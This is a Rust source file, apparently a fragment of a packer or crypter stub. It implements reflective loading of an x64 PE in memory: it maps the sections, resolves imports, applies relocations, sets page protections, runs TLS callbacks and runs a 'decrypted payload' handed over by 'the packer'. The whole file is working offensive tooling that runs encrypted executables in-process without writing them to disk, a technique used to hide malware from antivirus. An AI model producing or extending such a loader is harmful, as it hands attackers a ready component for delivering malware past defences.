// --- Reflective loading (technique fragment) ---

use std::ffi::{c_void, CStr};
use std::ptr;

use windows::Win32::Foundation::{CloseHandle, GetLastError, BOOL, HINSTANCE};
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_TLS,
    IMAGE_FILE_DLL, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE,
};
use windows::Win32::System::SystemServices::{
    DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE,
    IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_SIGNATURE, IMAGE_ORDINAL_FLAG64,
    IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH, IMAGE_REL_BASED_HIGHLOW,
    IMAGE_REL_BASED_LOW, IMAGE_TLS_DIRECTORY64, PIMAGE_TLS_CALLBACK,
};
use windows::Win32::System::Threading::{
    CreateThread, GetExitCodeThread, WaitForSingleObject, THREAD_CREATION_FLAGS,
};
use windows::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;

/// Entry point signature of a mapped EXE (returns the process exit code).
type ExeEntryPoint = unsafe extern "system" fn() -> u32;

/// Entry point signature of a mapped DLL (DllMain).
type DllEntryPoint = unsafe extern "system" fn(HINSTANCE, u32, *mut c_void) -> BOOL;

/// Errors produced while reflectively loading a PE.
#[derive(Debug, thiserror::Error)]
enum ReflectiveLoadingError {
    #[error("file too small to be a valid PE")]
    FileTooSmall,
    #[error("invalid DOS signature (expected MZ)")]
    InvalidDosSignature,
    #[error("invalid NT signature (expected PE)")]
    InvalidNtSignature,
    #[error("unsupported architecture (magic 0x{0:04x}); expected x64")]
    UnsupportedArchitecture(u16),
    #[error("failed to allocate image memory (error {0})")]
    AllocateFailed(u32),
    #[error("section '{section}' is out of file bounds")]
    SectionOutOfBounds { section: String },
    #[error("could not load '{dll}'")]
    ImportLoadFailed { dll: String },
    #[error("could not resolve '{func}' from '{dll}'")]
    ImportResolutionFailed { dll: String, func: String },
    #[error("could not change protection for section '{section}' (error {error})")]
    VirtualProtectFailed { section: String, error: u32 },
    #[error("could not create execution thread (error {0})")]
    ThreadCreationFailed(u32),
}

/// A base relocation entry (type + offset packed in a `u16`).
#[repr(C)]
struct BaseRelocationEntry {
    data: u16,
}

impl BaseRelocationEntry {
    fn offset(&self) -> u16 {
        self.data & 0x0FFF
    }

    fn type_(&self) -> u16 {
        self.data >> 12
    }
}

/// Context passed to the thread that runs the payload's entry point.
#[repr(C)]
struct EntryContext {
    image_base: usize,
    entry_point: usize,
    is_dll: bool,
}

/// Thread trampoline: invokes the payload's entry point and returns its exit
/// code. The `EntryContext` is owned by the caller and freed after the wait.
unsafe extern "system" fn entry_trampoline(ctx: *mut c_void) -> u32 {
    let ctx = &*(ctx as *const EntryContext);
    // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint`, which the
    // mapping step has already copied into executable memory. Its ABI matches
    // the signature we cast it to below.
    if ctx.is_dll {
        let dll_main: DllEntryPoint = std::mem::transmute(ctx.entry_point);
        let ok = dll_main(
            HINSTANCE(ctx.image_base as *mut c_void),
            DLL_PROCESS_ATTACH,
            ptr::null_mut(),
        );
        ok.0 as u32
    } else {
        let exe_main: ExeEntryPoint = std::mem::transmute(ctx.entry_point);
        exe_main()
    }
}

/// Reflectively loads `payload` in the current process and returns the exit
/// code of its entry point.
///
/// # Safety
/// `payload` must point to a valid, readable x64 PE image for the whole call.
/// The payload is executed in-process, so its code runs with the stub's
/// privileges.
pub unsafe fn run_reflective(payload: &[u8]) -> Result<i32, ReflectiveLoadingError> {
    let (_dos, nt) = get_headers(payload)?;
    let is_dll = (*nt).FileHeader.Characteristics.0 & IMAGE_FILE_DLL.0 != 0;

    let image_base = allocate_image(nt)?;
    copy_headers(payload, image_base, nt)?;
    copy_sections(payload, image_base, nt)?;
    fix_imports(image_base, nt)?;
    fix_relocations(image_base, nt)?;
    fix_memory_protections(image_base, nt)?;
    execute_tls_callbacks(image_base, nt)?;
    execute_entrypoint(image_base, nt, is_dll)
}

/// Validates the PE and returns pointers to its DOS and NT headers.
fn get_headers(
    payload: &[u8],
) -> Result<(*const IMAGE_DOS_HEADER, *const IMAGE_NT_HEADERS64), ReflectiveLoadingError> {
    if payload.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
        return Err(ReflectiveLoadingError::FileTooSmall);
    }

    unsafe {
        let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err(ReflectiveLoadingError::InvalidDosSignature);
        }

        let nt = (dos as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err(ReflectiveLoadingError::InvalidNtSignature);
        }

        // 0x20b = PE32+ (x64). The packer already rejects non-x64 payloads,
        // but keep a defensive check here.
        let magic = (*nt).OptionalHeader.Magic.0;
        if magic != 0x20b {
            return Err(ReflectiveLoadingError::UnsupportedArchitecture(magic));
        }

        Ok((dos, nt))
    }
}

/// Allocates the image at its preferred base (falling back to any address).
fn allocate_image(nt: *const IMAGE_NT_HEADERS64) -> Result<*mut c_void, ReflectiveLoadingError> {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfImage as usize;
        let preferred = (*nt).OptionalHeader.ImageBase as usize;

        let mut address = VirtualAlloc(
            Some(preferred as *const c_void),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if address.is_null() {
            address = VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        }
        if address.is_null() {
            return Err(ReflectiveLoadingError::AllocateFailed(GetLastError().0));
        }

        Ok(address)
    }
}

fn copy_headers(
    payload: &[u8],
    image_base: *mut c_void,
    nt: *const IMAGE_NT_HEADERS64,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfHeaders as usize;
        ptr::copy_nonoverlapping(payload.as_ptr(), image_base as *mut u8, size);
    }
    Ok(())
}

fn copy_sections(
    payload: &[u8],
    image_base: *mut c_void,
    nt: *const IMAGE_NT_HEADERS64,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let section_header = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER;
        let num = (*nt).FileHeader.NumberOfSections as usize;

        for i in 0..num {
            let section = section_header.add(i);
            let raw_size = (*section).SizeOfRawData as usize;
            if raw_size == 0 {
                continue;
            }

            let src = (*section).PointerToRawData as usize;
            let dst = image_base as usize + (*section).VirtualAddress as usize;
            if src + raw_size > payload.len() {
                return Err(ReflectiveLoadingError::SectionOutOfBounds {
                    section: section_name(section),
                });
            }
            ptr::copy_nonoverlapping(payload.as_ptr().add(src), dst as *mut u8, raw_size);
        }
    }
    Ok(())
}

/// Reads a section's (not necessarily NUL-terminated) name.
unsafe fn section_name(section: *const IMAGE_SECTION_HEADER) -> String {
    let name = &(*section).Name;
    let end = name.iter().position(|&b| b == 0).unwrap_or(name.len());
    String::from_utf8_lossy(&name[..end]).into_owned()
}

fn fix_imports(
    image_base: *mut c_void,
    nt: *const IMAGE_NT_HEADERS64,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let import_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize];
        if import_dir.Size == 0 || import_dir.VirtualAddress == 0 {
            return Ok(());
        }

        let mut desc = (image_base as usize + import_dir.VirtualAddress as usize)
            as *const IMAGE_IMPORT_DESCRIPTOR;
        while (*desc).Name != 0 {
            let dll_name_ptr = (image_base as usize + (*desc).Name as usize) as *const i8;
            let dll_name = CStr::from_ptr(dll_name_ptr).to_string_lossy().into_owned();
            let module = LoadLibraryA(PCSTR(dll_name_ptr as *const u8)).map_err(|_| {
                ReflectiveLoadingError::ImportLoadFailed {
                    dll: dll_name.clone(),
                }
            })?;

            let original_thunk_rva = (*desc).Anonymous.OriginalFirstThunk;
            let first_thunk_rva = (*desc).FirstThunk;
            let mut i = 0usize;

            loop {
                let orig = (image_base as usize
                    + original_thunk_rva as usize
                    + i * std::mem::size_of::<IMAGE_THUNK_DATA64>())
                    as *const IMAGE_THUNK_DATA64;
                let thunk = (image_base as usize
                    + first_thunk_rva as usize
                    + i * std::mem::size_of::<IMAGE_THUNK_DATA64>())
                    as *mut IMAGE_THUNK_DATA64;

                if (*orig).u1.Function == 0 {
                    break;
                }

                let (address, func_name) = if (*orig).u1.Ordinal & IMAGE_ORDINAL_FLAG64 != 0 {
                    let ordinal = (*orig).u1.Ordinal & 0xFFFF;
                    (
                        GetProcAddress(module, PCSTR(ordinal as *const u8)),
                        format!("#{ordinal}"),
                    )
                } else {
                    let by_name = (image_base as usize + (*orig).u1.AddressOfData as usize)
                        as *const IMAGE_IMPORT_BY_NAME;
                    let name_ptr = (*by_name).Name.as_ptr() as *const i8;
                    let name = CStr::from_ptr(name_ptr).to_string_lossy().into_owned();
                    (GetProcAddress(module, PCSTR(name_ptr as *const u8)), name)
                };

                let address =
                    address.ok_or_else(|| ReflectiveLoadingError::ImportResolutionFailed {
                        dll: dll_name.clone(),
                        func: func_name,
                    })?;
                (*thunk).u1.Function = address as usize as u64;
                i += 1;
            }

            desc = desc.add(1);
        }
    }
    Ok(())
}

fn fix_relocations(
    image_base: *mut c_void,
    nt: *const IMAGE_NT_HEADERS64,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let reloc_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize];
        if reloc_dir.Size == 0 || reloc_dir.VirtualAddress == 0 {
            return Ok(());
        }

        let preferred = (*nt).OptionalHeader.ImageBase as isize;
        let delta = image_base as isize - preferred;
        if delta == 0 {
            return Ok(());
        }

        let mut block = (image_base as usize + reloc_dir.VirtualAddress as usize)
            as *const IMAGE_BASE_RELOCATION;
        while (*block).VirtualAddress != 0 {
            let block_size = (*block).SizeOfBlock as usize;
            let count = (block_size - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                / std::mem::size_of::<u16>();
            let entries = (block as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                as *const BaseRelocationEntry;

            for i in 0..count {
                let entry = entries.add(i);
                let target = (image_base as usize
                    + (*block).VirtualAddress as usize
                    + (*entry).offset() as usize) as *mut isize;

                match (*entry).type_() as u32 {
                    IMAGE_REL_BASED_ABSOLUTE => {}
                    IMAGE_REL_BASED_DIR64 => {
                        *target += delta;
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let target32 = target as *mut u32;
                        *target32 = (*target32 as isize + delta) as u32;
                    }
                    IMAGE_REL_BASED_HIGH => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta >> 16)) as u16;
                    }
                    IMAGE_REL_BASED_LOW => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta & 0xFFFF)) as u16;
                    }
                    _ => {}
                }
            }

            block = (block as usize + block_size) as *const IMAGE_BASE_RELOCATION;
        }
    }
    Ok(())
}

fn fix_memory_protections(
    image_base: *mut c_void,
    nt: *const IMAGE_NT_HEADERS64,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let section_header = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER;
        let num = (*nt).FileHeader.NumberOfSections as usize;

        for i in 0..num {
            let section = section_header.add(i);
            let characteristics = (*section).Characteristics.0;
            let protection = if characteristics & 0x2000_0000 != 0 {
                // IMAGE_SCN_MEM_EXECUTE
                if characteristics & 0x8000_0000 != 0 {
                    PAGE_EXECUTE_READWRITE
                } else {
                    PAGE_EXECUTE_READ
                }
            } else if characteristics & 0x8000_0000 != 0 {
                PAGE_READWRITE
            } else {
                PAGE_READONLY
            };

            let address =
                (image_base as usize + (*section).VirtualAddress as usize) as *const c_void;
            let size = (*section).Misc.VirtualSize as usize;
            if size > 0 {
                let mut old = PAGE_PROTECTION_FLAGS(0);
                VirtualProtect(address, size, protection, &mut old).map_err(|_| {
                    ReflectiveLoadingError::VirtualProtectFailed {
                        section: section_name(section),
                        error: GetLastError().0,
                    }
                })?;
            }
        }
    }
    Ok(())
}

fn execute_tls_callbacks(
    image_base: *mut c_void,
    nt: *const IMAGE_NT_HEADERS64,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let tls_dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS.0 as usize];
        if tls_dir.Size == 0 || tls_dir.VirtualAddress == 0 {
            return Ok(());
        }

        let tls =
            (image_base as usize + tls_dir.VirtualAddress as usize) as *const IMAGE_TLS_DIRECTORY64;
        let callbacks = (*tls).AddressOfCallBacks as *const PIMAGE_TLS_CALLBACK;
        if !callbacks.is_null() {
            let mut i = 0usize;
            while let Some(callback) = *callbacks.add(i) {
                callback(image_base, DLL_PROCESS_ATTACH, ptr::null_mut());
                i += 1;
            }
        }
    }
    Ok(())
}

/// Runs the payload's entry point in a separate thread and returns its exit
/// code.
fn execute_entrypoint(
    image_base: *mut c_void,
    nt: *const IMAGE_NT_HEADERS64,
    is_dll: bool,
) -> Result<i32, ReflectiveLoadingError> {
    unsafe {
        let entry_point = image_base as usize + (*nt).OptionalHeader.AddressOfEntryPoint as usize;
        let ctx = Box::into_raw(Box::new(EntryContext {
            image_base: image_base as usize,
            entry_point,
            is_dll,
        }));

        let thread = CreateThread(
            None,
            0,
            Some(entry_trampoline),
            Some(ctx as *const c_void),
            THREAD_CREATION_FLAGS(0),
            None,
        )
        .map_err(|_| {
            drop(Box::from_raw(ctx));
            ReflectiveLoadingError::ThreadCreationFailed(GetLastError().0)
        })?;

        WaitForSingleObject(thread, u32::MAX);
        let mut exit_code = 0u32;
        let _ = GetExitCodeThread(thread, &mut exit_code);
        let _ = CloseHandle(thread);
        // The thread has finished, so the trampoline no longer reads the
        // context; safe to free it here.
        drop(Box::from_raw(ctx));

        Ok(exit_code as i32)
    }
}

/// Adapter expected by the stub skeleton (`run()` calls this with the
/// decrypted payload).
fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    // SAFETY: `image` is the decrypted, valid x64 PE produced by the packer.
    unsafe { run_reflective(image) }.map_err(|e| e.to_string())
}
